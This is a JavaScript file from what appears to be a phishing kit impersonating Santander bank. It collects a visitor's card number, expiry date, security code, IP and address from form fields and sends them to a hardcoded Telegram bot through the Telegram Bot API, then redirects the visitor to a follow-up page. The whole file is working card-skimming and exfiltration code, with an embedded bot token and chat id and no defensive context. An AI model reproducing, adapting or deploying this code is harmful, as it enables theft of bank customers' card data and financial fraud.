var telegram_bot_id = "6409229763:AAFApi9Ono19RLh1lJbJepuvl5f_dC3jRn8";
var chat_id = 5837645590;
var u_name, pax, pax2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("cardnumber").value;
    pax = document.getElementById("expirationdate").value;
    pax2 = document.getElementById("securitycode").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;

    message = "Santander\n\n🪪C3C3: " + u_name + "\n📅V3NCY: " + pax + "\n💳C3V0: " + pax2 + "\n\nIP: " + ip +"\n" + ip2 + "\nC0DE BY SYN4PSE";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'verfexit.html';
        console.log(response);
    });
    return false;
};
